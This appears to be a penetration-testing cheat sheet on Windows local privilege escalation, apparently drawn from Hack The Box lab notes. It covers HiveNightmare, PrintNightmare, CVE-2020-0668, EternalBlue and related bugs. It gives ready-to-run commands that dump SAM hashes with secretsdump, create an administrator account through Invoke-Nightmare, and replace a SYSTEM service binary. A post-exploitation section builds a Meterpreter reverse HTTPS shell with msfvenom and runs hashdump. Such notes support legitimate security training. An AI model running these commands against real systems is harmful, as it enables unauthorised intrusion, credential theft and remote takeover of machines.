# Kernel Exploits (Windows Privilege Escalation)

## Summary

Kernel exploits target vulnerabilities in the Windows kernel to elevate privileges from a low-privileged user to SYSTEM. These are especially effective on unpatched or end-of-life systems. They typically rely on gaining arbitrary file write or execution in a privileged context.
## Conditions for Exploitation

- Access to local shell (non-admin user)    
- OS is unpatched or missing specific security updates
- Vulnerable kernel version (commonly determined via `systeminfo` and hotfix enumeration)
- May require software such as Firefox Maintenance Service or Task Scheduler present
## Enumeration

### Check OS Version and Patch Level

```powershell
systeminfo
wmic qfe list brief
Get-Hotfix
```

### Check for Spooler Pipe (PrintNightmare)

```powershell
ls \\localhost\pipe\spoolss
```

### Check SAM File Permissions (HiveNightmare)

```powershell
icacls c:\Windows\System32\config\SAM
```

### Check Current Privileges

```cmd
whoami /priv
```

## Exploitation Examples

### CVE-2021-36934: HiveNightmare (SeriousSam)

- Non-admin can read SAM, SYSTEM, and SECURITY hives if shadow copies exist    
- Use `HiveNightmare.exe` PoC to dump hives
- Dump hashes using:

```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
```

### CVE-2021-1675 / CVE-2021-34527: PrintNightmare

- Exploit RpcAddPrinterDriver vulnerability
- PowerShell PoC: `Invoke-Nightmare`

```powershell
Set-ExecutionPolicy Bypass -Scope Process
Import-Module .\CVE-2021-1675.ps1
Invoke-Nightmare -NewUser hacker -NewPassword Pwnd1234! -DriverName PrintIt
```

### CVE-2020-0668: Arbitrary File Move via Service Tracing

- Move file into protected location and overwrite SYSTEM binary    
- Chain with startable service (e.g. Mozilla Maintenance Service)
- Build PoC in Visual Studio, run:

```cmd
CVE-2020-0668.exe source.exe dest.exe
```

- Replace corrupted binary with backup copy
- Start the service:

```cmd
net start MozillaMaintenance
```

- Receive SYSTEM shell via Meterpreter
### MS17-010: EternalBlue

- Remote Code Execution in SMBv1    
- Can be used locally if 445 is blocked externally
- Exploit with Metasploit or standalone EternalBlue script
### MS08-067: Server Service RCE

- RCE on older systems (XP, 2003)    
- Also works for local privilege escalation when port 445 is inaccessible
### ALPC Task Scheduler 0-Day

- Write arbitrary DACL to .job files    
- Chain with DLL hijack via Spooler service
- Exploited on HTB box: Hackback
## Post Exploitation

### Meterpreter Reverse Shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP LPORT=8443 -f exe > shell.exe
```

Start handler:

```bash
msfconsole -r handler.rc
```
### Hash Dump

```meterpreter
getuid
sysinfo
hashdump
```
## Notes

- These techniques are noisy and often require restarting services or creating files    
- Avoid using them in stealth operations unless scoped
- Always confirm patch level and target applicability before attempting kernel exploits
## Tools

- HiveNightmare.exe    
- CVE-2020-0668.exe
- Metasploit    
- impacket-secretsdump
- Invoke-Nightmare.ps1    
## References

- MSRC Bulletins
- Exploit-DB
- HTB machines: Legacy, Blue, Hackback
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Kernel-Exploits 